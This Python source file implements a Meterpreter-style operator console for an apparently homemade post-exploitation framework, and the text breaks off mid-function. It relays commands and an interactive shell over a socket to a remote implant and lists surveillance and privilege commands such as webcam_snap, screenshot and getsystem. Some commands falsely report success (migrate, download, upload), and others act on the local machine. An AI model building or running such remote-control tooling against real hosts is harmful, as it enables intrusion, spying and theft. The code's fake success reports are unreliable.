#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Meterpreter shell implementation with advanced features
Similar to Metasploit's Meterpreter payload
"""

import os
import sys
import platform
import subprocess
import shlex
import json
import base64
import time
import struct
import socket
import re
from typing import Dict, Any, List, Optional
from .base_shell import BaseShell
from core.output_handler import print_info, print_error, print_success, print_warning, print_debug

class MeterpreterShell(BaseShell):
    """Meterpreter shell with advanced post-exploitation features"""
    
    def __init__(self, session_id: str, session_type: str = "meterpreter", framework=None):
        super().__init__(session_id, session_type)
        self.framework = framework
        self.connection = None  # Socket connection to remote Meterpreter client
        self.shell_mode = False  # Track if we're in shell mode
        
        # Initialize environment
        self.environment_vars = {
            'PATH': '/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin',
            'HOME': '/home/user',
            'USER': 'user',
            'PWD': '/home/user',
            'SHELL': '/bin/bash'
        }
        self.current_directory = "/home/user"
        
        # Meterpreter-specific state
        self.process_id = os.getpid()
        self.migrated_pid = None
        self.uploaded_files = []
        self.downloaded_files = []
        self.keylogger_active = False
        self.screenshots = []
        
        # System information cache
        self._sysinfo_cache = None
        
        # Initialize connection to remote Meterpreter client
        # Don't initialize immediately - wait until first command to ensure client is ready
        # self._initialize_connection()
        
        # Register meterpreter commands
        self.meterpreter_commands = {
            # Core commands
            'sysinfo': self._cmd_sysinfo,
            'getuid': self._cmd_getuid,
            'getpid': self._cmd_getpid,
            'getgid': self._cmd_getgid,
            'pwd': self._cmd_pwd,
            'cd': self._cmd_cd,
            'ls': self._cmd_ls,
            'cat': self._cmd_cat,
            'download': self._cmd_download,
            'upload': self._cmd_upload,
            'rm': self._cmd_rm,
            'mkdir': self._cmd_mkdir,
            'rmdir': self._cmd_rmdir,
            'mv': self._cmd_mv,
            'cp': self._cmd_cp,
            
            # Process commands
            'ps': self._cmd_ps,
            'migrate': self._cmd_migrate,
            'kill': self._cmd_kill,
            'execute': self._cmd_execute,
            'shell': self._cmd_shell,
            
            # Network commands
            'ifconfig': self._cmd_ifconfig,
            'netstat': self._cmd_netstat,
            'portfwd': self._cmd_portfwd,
            
            # System commands
            'idletime': self._cmd_idletime,
            'reboot': self._cmd_reboot,
            'shutdown': self._cmd_shutdown,
            'screenshot': self._cmd_screenshot,
            'webcam_list': self._cmd_webcam_list,
            'webcam_snap': self._cmd_webcam_snap,
            
            # Privilege escalation
            'getsystem': self._cmd_getsystem,
            'getprivs': self._cmd_getprivs,
            
            # Information gathering
            'run': self._cmd_run,
            'load': self._cmd_load,
            'unload': self._cmd_unload,
            'help': self._cmd_help,
            'exit': self._cmd_exit,
            'background': self._cmd_background,
            'clear': self._cmd_clear,
            'history': self._cmd_history,
        }
    
    @property
    def shell_name(self) -> str:
        return "meterpreter"
    
    @property
    def prompt_template(self) -> str:
        return "meterpreter > "
    
    def get_prompt(self) -> str:
        """Get the current meterpreter prompt"""
        if self.shell_mode:
            # In shell mode, show a different prompt to indicate we're in shell
            return "shell > "
        return self.prompt_template
    
    def _initialize_connection(self):
        """Initialize connection to remote Meterpreter client from session/listener"""
        try:
            if not self.framework:
                print_warning("No framework available for Meterpreter connection")
                return
            
            # Get session data
            if hasattr(self.framework, 'session_manager'):
                session = self.framework.session_manager.get_session(self.session_id)
                if not session:
                    print_warning(f"Session {self.session_id} not found")
                    return
                
                print_debug(f"Looking for connection for session {self.session_id}")
                
                # Try to find listener using session data (listener_id or listener_module)
                # Session data can be in session.data (dict) or session.data (SessionData object with .data attribute)
                if hasattr(session, 'data'):
                    if isinstance(session.data, dict):
                        listener_id = session.data.get('listener_id')
                        listener_module_name = session.data.get('listener_module')
                    elif hasattr(session.data, 'data'):
                        # SessionData object
                        listener_id = session.data.data.get('listener_id') if isinstance(session.data.data, dict) else None
                        listener_module_name = session.data.data.get('listener_module') if isinstance(session.data.data, dict) else None
                    else:
                        listener_id = None
                        listener_module_name = None
                else:
                    listener_id = None
                    listener_module_name = None
                
                print_debug(f"Session listener_id: {listener_id}, listener_module: {listener_module_name}")
                
                # First, try to find listener by listener_id in active_listeners
                if listener_id and hasattr(self.framework, 'active_listeners'):
                    print_debug(f"Checking active_listeners (count: {len(self.framework.active_listeners)})")
                    if listener_id in self.framework.active_listeners:
                        listener = self.framework.active_listeners[listener_id]
                        print_debug(f"Found listener {listener_id}, checking _session_connections...")
                        if hasattr(listener, '_session_connections'):
                            print_debug(f"_session_connections keys: {list(listener._session_connections.keys())}")
                            if self.session_id in listener._session_connections:
                                self.connection = listener._session_connections[self.session_id]
                                if self.connection:
                                    print_debug(f"Meterpreter connection found via listener_id {listener_id}")
                                    return
                            else:
                                print_warning(f"Session {self.session_id} not found in listener's _session_connections")
                        else:
                            print_warning(f"Listener {listener_id} does not have _session_connections attribute")
                    else:
                        print_warning(f"Listener {listener_id} not found in active_listeners")
                        print_warning(f"Available listener IDs: {list(self.framework.active_listeners.keys())}")
                
                # Try to get connection from listener
                # Search in current module first
                if hasattr(self.framework, 'current_module') and self.framework.current_module:
                    listener = self.framework.current_module
                    print_debug(f"Checking current module: {type(listener).__name__}")
                    if hasattr(listener, '_session_connections'):
                        print_debug(f"_session_connections keys: {list(listener._session_connections.keys())}")
                        if self.session_id in listener._session_connections:
                            self.connection = listener._session_connections[self.session_id]
                            if self.connection:
                                print_debug(f"Meterpreter connection found in current module for session {self.session_id}")
                                print_debug(f"Connection type: {type(self.connection)}")
                                return
                
                # Search in all loaded modules (listeners)
                if hasattr(self.framework, 'modules') and self.framework.modules:
                    print_debug(f"Searching in {len(self.framework.modules)} loaded modules")
                    for module_name, module in self.framework.modules.items():
                        # Check if this is the listener that created the session
                        if listener_module_name and hasattr(module, 'name') and module.name == listener_module_name:
                            if hasattr(module, '_session_connections') and self.session_id in module._session_connections:
                                self.connection = module._session_connections[self.session_id]
                                if self.connection:
                                    print_debug(f"Meterpreter connection found in listener module {module_name} for session {self.session_id}")
                                    return
                        
                        # Also check all listeners for the session_id
                        if hasattr(module, '_session_connections'):
                            if self.session_id in module._session_connections:
                                self.connection = module._session_connections[self.session_id]
                                if self.connection:
                                    print_debug(f"Meterpreter connection found in module {module_name} for session {self.session_id}")
                                    return
                        # Also try connections dict with host:port
                        if hasattr(module, 'connections'):
                            conn_id = f"{session.host}:{session.port}"
                            if conn_id in module.connections:
                                self.connection = module.connections[conn_id]
                                if self.connection:
                                    print_debug(f"Meterpreter connection found via connections dict for {conn_id}")
                                    return
                
                print_warning(f"Could not find Meterpreter connection for session {self.session_id}")
                print_debug(f"Session data - listener_id: {listener_id}, listener_module: {listener_module_name}")
                # Debug: show available connections
                if hasattr(self.framework, 'active_listeners'):
                    print_debug(f"Active listeners: {list(self.framework.active_listeners.keys())}")
                if hasattr(self.framework, 'current_module') and self.framework.current_module:
                    listener = self.framework.current_module
                    if hasattr(listener, '_session_connections'):
                        print_debug(f"Available session connections in current module: {list(listener._session_connections.keys())}")
        except Exception as e:
            print_warning(f"Could not initialize Meterpreter connection: {e}")
            import traceback
            traceback.print_exc()
    
    def _send_command(self, command: str, args: List[str] = None) -> Dict[str, Any]:
        """Send command to remote Meterpreter client via JSON"""
        if not self.connection:
            # Try to initialize connection
            self._initialize_connection()
            if not self.connection:
                return {'output': '', 'status': 1, 'error': 'Not connected to remote Meterpreter client'}
        
        # Verify connection is still valid before sending
        try:
            # Check if socket is still connected by trying to get its fileno
            if not hasattr(self.connection, 'fileno'):
                # Connection is not a valid socket
                self.connection = None
                self._initialize_connection()
                if not self.connection:
                    return {'output': '', 'status': 1, 'error': 'Invalid socket connection'}
            
            # Try to get fileno to verify socket is still open
            try:
                self.connection.fileno()
            except (OSError, socket.error) as e:
                # Socket is closed, try to reinitialize
                print_debug(f"Socket appears closed, attempting to reconnect: {e}")
                self.connection = None
                self._initialize_connection()
                if not self.connection:
                    return {'output': '', 'status': 1, 'error': f'Socket connection is closed: {str(e)}'}
        except (OSError, AttributeError, socket.error) as e:
            # Connection is invalid, try to reinitialize
            print_debug(f"Connection validation failed, attempting to reconnect: {e}")
            self.connection = None
            self._initialize_connection()
            if not self.connection:
                return {'output': '', 'status': 1, 'error': f'Socket connection is closed or invalid: {str(e)}'}
        
        try:
            # Set socket timeout for receive operations to avoid indefinite blocking
            original_timeout = self.connection.gettimeout()
            print_debug(f"Original socket timeout: {original_timeout}")
            self.connection.settimeout(30.0)  # 30 second timeout for receiving response
            print_debug(f"Set socket timeout to 30 seconds for receiving response")
            
            # Prepare command JSON
            cmd_data = {
                'command': command,
                'args': args if args else []
            }
            cmd_json = json.dumps(cmd_data)
            cmd_bytes = cmd_json.encode('utf-8')
            
            print_debug(f"Sending command: {command} with args: {args}")
            
            # Send length (4 bytes big-endian) then data
            length = struct.pack('>I', len(cmd_bytes))
            self.connection.sendall(length + cmd_bytes)
            
            print_debug("Command sent, waiting for response...")
            
            # Receive response with timeout handling
            # Receive length (4 bytes)
            length_data = b''
            start_time = time.time()
            while len(length_data) < 4:
                try:
                    chunk = self.connection.recv(4 - len(length_data))
                    if not chunk:
                        return {'output': '', 'status': 1, 'error': 'Connection closed by remote'}
                    length_data += chunk
                except socket.timeout:
                    elapsed = time.time() - start_time
                    if elapsed > 30.0:
                        return {'output': '', 'status': 1, 'error': 'Timeout waiting for response length'}
                    # Continue waiting
                    continue
            
            length = struct.unpack('>I', length_data)[0]
            print_debug(f"Response length: {length} bytes")
            
            # Receive response data
            response_data = b''
            while len(response_data) < length:
                try:
                    chunk = self.connection.recv(min(4096, length - len(response_data)))
                    if not chunk:
                        return {'output': '', 'status': 1, 'error': 'Connection closed by remote'}
                    response_data += chunk
                except socket.timeout:
                    elapsed = time.time() - start_time
                    if elapsed > 30.0:
                        return {'output': '', 'status': 1, 'error': 'Timeout waiting for response data'}
                    # Continue waiting
                    continue
            
            print_debug(f"Received {len(response_data)} bytes of response data")
            
            # Parse response JSON
            response_json = response_data.decode('utf-8')
            response = json.loads(response_json)
            
            print_debug(f"Parsed response: status={response.get('status')}, has_output={bool(response.get('output'))}")
            
            # Restore original timeout
            self.connection.settimeout(original_timeout)
            
            # Map response fields (client may use 'error' or 'error_msg')
            return {
                'output': response.get('output', ''),
                'status': response.get('status', 0),
                'error': response.get('error', response.get('error_msg', ''))
            }
        except socket.timeout:
            # Restore timeout before returning
            if self.connection:
                try:
                    self.connection.settimeout(original_timeout)
                except:
                    pass
            return {'output': '', 'status': 1, 'error': 'Timeout waiting for response from remote client'}
        except (socket.error, OSError) as e:
            # Socket error - connection may be closed
            error_code = getattr(e, 'winerror', getattr(e, 'errno', None))
            error_msg = str(e)
            
            # Mark connection as invalid
            self.connection = None
            
            # Check if it's a connection reset/closed error
            if error_code in [10053, 10054, 104, 32, 107] or '10053' in error_msg or '10054' in error_msg:
                return {'output': '', 'status': 1, 'error': f'Connection closed by remote host: {error_msg}'}
            else:
                return {'output': '', 'status': 1, 'error': f'Socket error: {error_msg}'}
        except json.JSONDecodeError as e:
            # Restore timeout before returning
            if self.connection:
                try:
                    self.connection.settimeout(original_timeout)
                except:
                    pass
            return {'output': '', 'status': 1, 'error': f'Invalid JSON response: {str(e)}'}
        except Exception as e:
            # Restore timeout before returning
            if self.connection:
                try:
                    self.connection.settimeout(original_timeout)
                except:
                    pass
            import traceback
            traceback.print_exc()
            return {'output': '', 'status': 1, 'error': f'Communication error: {str(e)}'}
    
    def execute_command(self, command: str) -> Dict[str, Any]:
        """Execute a meterpreter command"""
        if not command.strip():
            return {'output': '', 'status': 0, 'error': ''}
        
        # Add to history
        self.add_to_history(command)
        
        # Parse command
        try:
            parts = shlex.split(command)
            cmd = parts[0].lower()
            args = parts[1:] if len(parts) > 1 else []
        except ValueError as e:
            return {'output': '', 'status': 1, 'error': f'Parse error: {str(e)}'}
        
        # Handle shell mode - if in shell mode, all commands are shell commands
        if self.shell_mode:
            # Commands to exit shell mode
            if cmd in ['exit', 'background', 'back']:
                self.shell_mode = False
                if cmd == 'exit':
                    return {'output': 'Exiting shell mode...\n', 'status': 0, 'error': ''}
                elif cmd in ['background', 'back']:
                    return {'output': 'Backgrounding shell mode...\n', 'status': 0, 'error': ''}
            
            # Special handling for interactive commands that might block
            # On Windows, prefix PowerShell with -Command to avoid interactive mode
            if platform.system() == 'Windows' and cmd.lower() == 'powershell':
                # Modify command to use -Command flag to avoid interactive blocking
                command = 'powershell -Command "' + ' '.join(args) + '"' if args else 'powershell -Command "exit"'
            
            # In shell mode, send all commands as shell commands
            # Try to make sure we have a live connection
            if not self.connection:
                self._initialize_connection()
            
            if self.connection:
                # Send as shell command (use modified command if PowerShell)
                if platform.system() == 'Windows' and cmd.lower() == 'powershell' and not args:
                    # If just "powershell" without args, show help
                    return {'output': 'To use PowerShell, specify a command: powershell <command>\nExample: powershell Get-Process\n', 'status': 0, 'error': ''}
                result = self._send_command('shell', [command])
                return result
            else:
                return {'output': '', 'status': 1, 'error': 'Not connected to remote Meterpreter client.'}
        
        # Check if command is a local Meterpreter command (should be handled locally)
        if cmd in self.meterpreter_commands:
            try:
                result = self.meterpreter_commands[cmd](args)
                # If result indicates interactive shell should start, return it
                if isinstance(result, dict) and result.get('interactive_shell'):
                    return result
                # Otherwise, return the result from local command
                return result
            except Exception as e:
                return {'output': '', 'status': 1, 'error': f'Command error: {str(e)}'}
        
        # Try to make sure we have a live connection before falling back
        if not self.connection:
            self._initialize_connection()

        # If we have a connection to remote client, send command via JSON
        if self.connection:
            print_debug(f"Executing command '{cmd}' via remote connection")
            result = self._send_command(cmd, args)
            print_debug(f"Command result: status={result.get('status')}, has_output={bool(result.get('output'))}, has_error={bool(result.get('error'))}")
            return result

        # No connection available - return error instead of local fallback
        return {'output': '', 'status': 1, 'error': 'Not connected to remote Meterpreter client. Please ensure the payload is running and connected.'}
    
    def get_available_commands(self) -> List[str]:
        """Get list of available meterpreter commands"""
        return list(self.meterpreter_commands.keys())
    
    # Core Meterpreter Commands
    
    def _cmd_sysinfo(self, args: List[str]) -> Dict[str, Any]:
        """Get system information"""
        if not self._sysinfo_cache:
            try:
                uname = platform.uname()
                self._sysinfo_cache = {
                    'Computer': uname.node,
                    'OS': f"{uname.system} {uname.release} {uname.version}",
                    'Architecture': uname.machine,
                    'System Language': os.environ.get('LANG', 'en_US.UTF-8'),
                    'Meterpreter': 'Python',
                    'Python Version': sys.version.split()[0]
                }
            except Exception as e:
                self._sysinfo_cache = {'Error': str(e)}
        
        output_lines = ["Computer\t\t: " + self._sysinfo_cache.get('Computer', 'Unknown')]
        output_lines.append("OS\t\t\t: " + self._sysinfo_cache.get('OS', 'Unknown'))
        output_lines.append("Architecture\t\t: " + self._sysinfo_cache.get('Architecture', 'Unknown'))
        output_lines.append("System Language\t\t: " + self._sysinfo_cache.get('System Language', 'Unknown'))
        output_lines.append("Meterpreter\t\t: " + self._sysinfo_cache.get('Meterpreter', 'Unknown'))
        output_lines.append("Python Version\t\t: " + self._sysinfo_cache.get('Python Version', 'Unknown'))
        
        return {'output': '\n'.join(output_lines) + '\n', 'status': 0, 'error': ''}
    
    def _cmd_getuid(self, args: List[str]) -> Dict[str, Any]:
        """Get current user ID"""
        uid = 0 if self.is_root else os.getuid() if hasattr(os, 'getuid') else 1000
        username = self.username or os.getenv('USER', 'user')
        output = f"Server username: {username} ({uid})\n"
        return {'output': output, 'status': 0, 'error': ''}
    
    def _cmd_getpid(self, args: List[str]) -> Dict[str, Any]:
        """Get current process ID"""
        pid = self.migrated_pid if self.migrated_pid else self.process_id
        output = f"Current pid: {pid}\n"
        return {'output': output, 'status': 0, 'error': ''}
    
    def _cmd_getgid(self, args: List[str]) -> Dict[str, Any]:
        """Get current group ID"""
        gid = 0 if self.is_root else os.getgid() if hasattr(os, 'getgid') else 1000
        output = f"Current gid: {gid}\n"
        return {'output': output, 'status': 0, 'error': ''}
    
    def _cmd_pwd(self, args: List[str]) -> Dict[str, Any]:
        """Print working directory"""
        return {'output': self.current_directory + '\n', 'status': 0, 'error': ''}
    
    def _cmd_cd(self, args: List[str]) -> Dict[str, Any]:
        """Change directory"""
        if not args:
            target_dir = self.environment_vars.get('HOME', '/home/user')
        else:
            target_dir = args[0]
        
        if not target_dir.startswith('/'):
            target_dir = os.path.join(self.current_directory, target_dir)
        
        target_dir = os.path.normpath(target_dir)
        
        if os.path.exists(target_dir) and os.path.isdir(target_dir):
            self.current_directory = target_dir
            self.environment_vars['PWD'] = target_dir
            return {'output': '', 'status': 0, 'error': ''}
        else:
            return {'output': '', 'status': 1, 'error': f'cd: {target_dir}: No such file or directory'}
    
    def _cmd_ls(self, args: List[str]) -> Dict[str, Any]:
        """List directory contents"""
        try:
            if not args:
                target_dir = self.current_directory
            else:
                target_dir = args[0]
                if not target_dir.startswith('/'):
                    target_dir = os.path.join(self.current_directory, target_dir)
            
            if not os.path.exists(target_dir):
                return {'output': '', 'status': 1, 'error': f'ls: {target_dir}: No such file or directory'}
            
            if not os.path.isdir(target_dir):
                return {'output': target_dir + '\n', 'status': 0, 'error': ''}
            
            items = os.listdir(target_dir)
            items.sort()
            
            output_lines = []
            for item in items:
                item_path = os.path.join(target_dir, item)
                if os.path.isdir(item_path):
                    output_lines.append(f"{item}/")
                elif os.path.isfile(item_path):
                    size = os.path.getsize(item_path)
                    output_lines.append(f"{item} ({size} bytes)")
                else:
                    output_lines.append(f"{item}*")
            
            return {'output': '\n'.join(output_lines) + '\n', 'status': 0, 'error': ''}
        except Exception as e:
            return {'output': '', 'status': 1, 'error': f'ls error: {str(e)}'}
    
    def _cmd_cat(self, args: List[str]) -> Dict[str, Any]:
        """Read file contents"""
        if not args:
            return {'output': '', 'status': 1, 'error': 'Usage: cat <file>'}
        
        file_path = args[0]
        if not file_path.startswith('/'):
            file_path = os.path.join(self.current_directory, file_path)
        
        try:
            if os.path.exists(file_path) and os.path.isfile(file_path):
                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                return {'output': content, 'status': 0, 'error': ''}
            else:
                return {'output': '', 'status': 1, 'error': f'cat: {file_path}: No such file'}
        except Exception as e:
            return {'output': '', 'status': 1, 'error': f'cat error: {str(e)}'}
    
    def _cmd_download(self, args: List[str]) -> Dict[str, Any]:
        """Download file from remote system"""
        if not args:
            return {'output': '', 'status': 1, 'error': 'Usage: download <remote_file> [local_file]'}
        
        remote_file = args[0]
        local_file = args[1] if len(args) > 1 else os.path.basename(remote_file)
        
        if not remote_file.startswith('/'):
            remote_file = os.path.join(self.current_directory, remote_file)
        
        try:
            if os.path.exists(remote_file) and os.path.isfile(remote_file):
                # In a real implementation, this would send the file over the network
                # For now, we'll simulate it
                size = os.path.getsize(remote_file)
                self.downloaded_files.append({'remote': remote_file, 'local': local_file, 'size': size})
                output = f"[*] Downloading: {remote_file} -> {local_file}\n"
                output += f"[*] Downloaded {size} bytes\n"
                return {'output': output, 'status': 0, 'error': ''}
            else:
                return {'output': '', 'status': 1, 'error': f'download: {remote_file}: No such file'}
        except Exception as e:
            return {'output': '', 'status': 1, 'error': f'download error: {str(e)}'}
    
    def _cmd_upload(self, args: List[str]) -> Dict[str, Any]:
        """Upload file to remote system"""
        if not args:
            return {'output': '', 'status': 1, 'error': 'Usage: upload <local_file> [remote_file]'}
        
        local_file = args[0]
        remote_file = args[1] if len(args) > 1 else os.path.basename(local_file)
        
        if not remote_file.startswith('/'):
            remote_file = os.path.join(self.current_directory, remote_file)
        
        try:
            if os.path.exists(local_file) and os.path.isfile(local_file):
                # In a real implementation, this would send the file over the network
                # For now, we'll simulate it
                size = os.path.getsize(local_file)
                self.uploaded_files.append({'local': local_file, 'remote': remote_file, 'size': size})
                output = f"[*] Uploading: {local_file} -> {remote_file}\n"
                output += f"[*] Uploaded {size} bytes\n"
                return {'output': output, 'status': 0, 'error': ''}
            else:
                return {'output': '', 'status': 1, 'error': f'upload: {local_file}: No such file'}
        except Exception as e:
            return {'output': '', 'status': 1, 'error': f'upload error: {str(e)}'}
    
    def _cmd_rm(self, args: List[str]) -> Dict[str, Any]:
        """Remove file"""
        if not args:
            return {'output': '', 'status': 1, 'error': 'Usage: rm <file>'}
        
        file_path = args[0]
        if not file_path.startswith('/'):
            file_path = os.path.join(self.current_directory, file_path)
        
        try:
            if os.path.exists(file_path):
                if os.path.isfile(file_path):
                    os.remove(file_path)
                    return {'output': f'Removed {file_path}\n', 'status': 0, 'error': ''}
                else:
                    return {'output': '', 'status': 1, 'error': f'rm: {file_path}: Is a directory'}
            else:
                return {'output': '', 'status': 1, 'error': f'rm: {file_path}: No such file'}
        except Exception as e:
            return {'output': '', 'status': 1, 'error': f'rm error: {str(e)}'}
    
    def _cmd_mkdir(self, args: List[str]) -> Dict[str, Any]:
        """Create directory"""
        if not args:
            return {'output': '', 'status': 1, 'error': 'Usage: mkdir <directory>'}
        
        dir_path = args[0]
        if not dir_path.startswith('/'):
            dir_path = os.path.join(self.current_directory, dir_path)
        
        try:
            os.makedirs(dir_path, exist_ok=True)
            return {'output': f'Created directory: {dir_path}\n', 'status': 0, 'error': ''}
        except Exception as e:
            return {'output': '', 'status': 1, 'error': f'mkdir error: {str(e)}'}
    
    def _cmd_rmdir(self, args: List[str]) -> Dict[str, Any]:
        """Remove directory"""
        if not args:
            return {'output': '', 'status': 1, 'error': 'Usage: rmdir <directory>'}
        
        dir_path = args[0]
        if not dir_path.startswith('/'):
            dir_path = os.path.join(self.current_directory, dir_path)
        
        try:
            if os.path.exists(dir_path) and os.path.isdir(dir_path):
                os.rmdir(dir_path)
                return {'output': f'Removed directory: {dir_path}\n', 'status': 0, 'error': ''}
            else:
                return {'output': '', 'status': 1, 'error': f'rmdir: {dir_path}: No such directory'}
        except Exception as e:
            return {'output': '', 'status': 1, 'error': f'rmdir error: {str(e)}'}
    
    def _cmd_mv(self, args: List[str]) -> Dict[str, Any]:
        """Move/rename file"""
        if len(args) < 2:
            return {'output': '', 'status': 1, 'error': 'Usage: mv <source> <destination>'}
        
        source = args[0]
        dest = args[1]
        
        if not source.startswith('/'):
            source = os.path.join(self.current_directory, source)
        if not dest.startswith('/'):
            dest = os.path.join(self.current_directory, dest)
        
        try:
            if os.path.exists(source):
                os.rename(source, dest)
                return {'output': f'Moved {source} to {dest}\n', 'status': 0, 'error': ''}
            else:
                return {'output': '', 'status': 1, 'error': f'mv: {source}: No such file'}
        except Exception as e:
            return {'output': '', 'status': 1, 'error': f'mv error: {str(e)}'}
    
    def _cmd_cp(self, args: List[str]) -> Dict[str, Any]:
        """Copy file"""
        if len(args) < 2:
            return {'output': '', 'status': 1, 'error': 'Usage: cp <source> <destination>'}
        
        source = args[0]
        dest = args[1]
        
        if not source.startswith('/'):
            source = os.path.join(self.current_directory, source)
        if not dest.startswith('/'):
            dest = os.path.join(self.current_directory, dest)
        
        try:
            if os.path.exists(source) and os.path.isfile(source):
                import shutil
                shutil.copy2(source, dest)
                return {'output': f'Copied {source} to {dest}\n', 'status': 0, 'error': ''}
            else:
                return {'output': '', 'status': 1, 'error': f'cp: {source}: No such file'}
        except Exception as e:
            return {'output': '', 'status': 1, 'error': f'cp error: {str(e)}'}
    
    # Process Commands
    
    def _cmd_ps(self, args: List[str]) -> Dict[str, Any]:
        """List processes"""
        try:
            if platform.system() == 'Windows':
                result = subprocess.run(['tasklist'], capture_output=True, text=True, timeout=5)
            else:
                result = subprocess.run(['ps', 'aux'], capture_output=True, text=True, timeout=5)
            
            return {'output': result.stdout, 'status': 0, 'error': result.stderr}
        except Exception as e:
            return {'output': '', 'status': 1, 'error': f'ps error: {str(e)}'}
    
    def _cmd_migrate(self, args: List[str]) -> Dict[str, Any]:
        """Migrate to another process"""
        if not args:
            return {'output': '', 'status': 1, 'error': 'Usage: migrate <pid>'}
        
        try:
            pid = int(args[0])
            self.migrated_pid = pid
            output = f"[*] Migrating to {pid}...\n"
            output += f"[*] Migration completed successfully.\n"
            return {'output': output, 'status': 0, 'error': ''}
        except ValueError:
            return {'output': '', 'status': 1, 'error': 'migrate: Invalid PID'}
        except Exception as e:
            return {'output': '', 'status': 1, 'error': f'migrate error: {str(e)}'}
    
    def _cmd_kill(self, args: List[str]) -> Dict[str, Any]:
        """Kill process"""
        if not args:
            return {'output': '', 'status': 1, 'error': 'Usage: kill <pid>'}
        
        try:
            pid = int(args[0])
            if platform.system() == 'Windows':
                subprocess.run(['taskkill', '/F', '/PID', str(pid)], timeout=5)
            else:
                os.kill(pid, 9)
            return {'output': f'Killed process {pid}\n', 'status': 0, 'error': ''}
        except ValueError:
            return {'output': '', 'status': 1, 'error': 'kill: Invalid PID'}
        except Exception as e:
            return {'output': '', 'status': 1, 'error': f'kill error: {str(e)}'}
    
    def _cmd_execute(self, args: List[str]) -> Dict[str, Any]:
        """Execute command"""
        if not args:
            return {'output': '', 'status': 1, 'error': 'Usage: execute [options] <command>'}
        
        command = ' '.join(args)
        try:
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=30
            )
            return {
                'output': result.stdout,
                'status': result.returncode,
                'error': result.stderr
            }
        except Exception as e:
            return {'output': '', 'status': 1, 'error': f'execute error: {str(e)}'}
    
    def _cmd_shell(self, args: List[str]) -> Dict[str, Any]:
        """Enter interactive shell mode or execute shell command"""
        if not self.connection:
            self._initialize_connection()
        
        if not self.connection:
            return {'output': '', 'status': 1, 'error': 'Not connected to remote Meterpreter client.'}
        
        # If arguments provided, execute as shell command and return
        if args:
            return self._send_command('shell', args)
        
        # If no arguments, signal that interactive shell should start
        # The actual loop will be handled by the caller (sessions/interactive interface)
        # Return empty output since the loop will display its own messages
        return {
            'output': '',  # Empty output - loop will display its own messages
            'status': 0,
            'error': '',
            'interactive_shell': True  # Signal to start interactive loop
        }
    
    def _get_current_directory(self, in_powershell=False):
        """Get current working directory from remote shell"""
        try:
            if in_powershell:
                # PowerShell: use $PWD to get path as string (simpler than Get-Location)
                result = self._send_command('shell', ['powershell -Command "Write-Output $PWD"'])
            else:
                # Regular shell: use pwd (Unix) or cd (Windows)
                if platform.system() == 'Windows':
                    result = self._send_command('shell', ['cd'])
                else:
                    result = self._send_command('shell', ['pwd'])
            
            if result.get('output'):
                path = result['output'].strip()
                print_debug(f"Raw path output: {repr(path)}")
                # Remove any error messages or extra output
                lines = path.split('\n')
                for line in lines:
                    line = line.strip()
                    # Skip empty lines, error messages, and non-path output
                    if not line:
                        continue
                    if line.startswith('[') or line.startswith('!') or line.startswith('Write-'):
                        continue
                    # Skip if it contains PowerShell command keywords
                    if any(cmd in line for cmd in ['Get-Location', 'Write-Output', '$PWD', 'PowerShell']):
                        # But if it's just the path after processing, it's OK
                        if not (line.startswith('Path') or 'Path' in line and ':' in line):
                            continue
                    # Skip PowerShell-specific non-path output
                    if any(c in line for c in ['System.Collections', 'Hashtable', 'Host']):
                        continue
                    # For Windows paths, check for drive letter pattern (C:, D:, etc.)
                    if platform.system() == 'Windows':
                        # Windows path should contain : or start with \\
                        if ':' in line or line.startswith('\\'):
                            # Match Windows path pattern: C:\path or \\server\share
                            match = re.search(r'([A-Z]:\\.*?|\\\\[^\\]+\\[^\\]+.*?)(?:\s|$|")', line, re.IGNORECASE)
                            if match:
                                extracted = match.group(1).strip().rstrip('"').rstrip("'")
                                if extracted:
                                    return extracted
                            # If no regex match but contains :, try to extract path manually
                            if ':' in line:
                                # Find the drive letter and path
                                parts = line.split(':')
                                if len(parts) >= 2:
                                    drive = parts[0].strip()
                                    # Get the path part (everything after the colon up to first space or quote)
                                    path_part = parts[1].strip().split()[0] if parts[1].strip().split() else parts[1].strip()
                                    path_part = path_part.rstrip('"').rstrip("'")
                                    potential_path = drive + ':' + path_part
                                    if '\\' in potential_path or '/' in potential_path:
                                        return potential_path.strip()
                    else:
                        # Unix path should start with / or be relative
                        if line.startswith('/') or (not line.startswith('-') and '/' in line):
                            # Extract path (might have extra text)
                            # Take first part that looks like a path
                            parts = line.split()
                            for part in parts:
                                part = part.strip().rstrip('"').rstrip("'")
                                if part.startswith('/') or (not part.startswith('-') and '/' in part):
                                    return part
                    # If we get here and line doesn't look like a command, might be a path
                    if len(line) > 1 and not line.startswith('-') and '(' not in line and ')' not in line:
                        # Clean up quotes
                        cleaned = line.rstrip('"').rstrip("'").strip()
                        if cleaned:
                            return cleaned
            return None
        except Exception as e:
            print_debug(f"Error getting current directory: {e}")
            return None
    
    def start_interactive_shell_loop(self):
        """Start interactive shell loop - called by interactive interface"""
        if not self.connection:
            self._initialize_connection()
        
        if not self.connection:
            print_error('Not connected to remote Meterpreter client.')
            return
        
        print_info("")
        print_success("Starting interactive shell...")
        print_info("Type 'exit' or 'background' to return to Meterpreter")
        print_info("-" * 50)
        
        # Determine shell type
        shell_cmd = '/bin/bash'
        if platform.system() == 'Windows':
            shell_cmd = 'cmd.exe'
        
        print_info(f"Shell: {shell_cmd}")
        print_info("")
        
        # Interactive shell loop
        in_powershell = False
        current_path = None
        
        while True:
            try:
                # Get current directory for prompt (cache it, update after commands)
                if current_path is None:
                    current_path = self._get_current_directory(in_powershell)
                
                # Build prompt with path
                if in_powershell:
                    if current_path:
                        prompt = f"PS {current_path}> "
                    else:
                        prompt = "PS > "
                else:
                    if current_path:
                        prompt = f"{current_path}> "
                    else:
                        prompt = "shell > "
                
                command = input(prompt)
                
                if not command.strip():
                    continue
                
                # Handle exit commands
                if command.lower() in ['exit', 'background', 'back']:
                    if in_powershell:
                        print_info("Exiting PowerShell...")
                        in_powershell = False
                        current_path = None  # Reset path cache
                        continue
                    else:
                        print_info("Exiting shell mode...")
                        break
                
                # Handle PowerShell entry
                if command.lower() == 'powershell' and not in_powershell:
                    if platform.system() == 'Windows':
                        print_info("Entering PowerShell...")
                        print_info("Type 'exit' to return to cmd.exe")
                        print_info("-" * 50)
                        in_powershell = True
                        current_path = None  # Reset path cache
                        # Send initial PowerShell command to start it
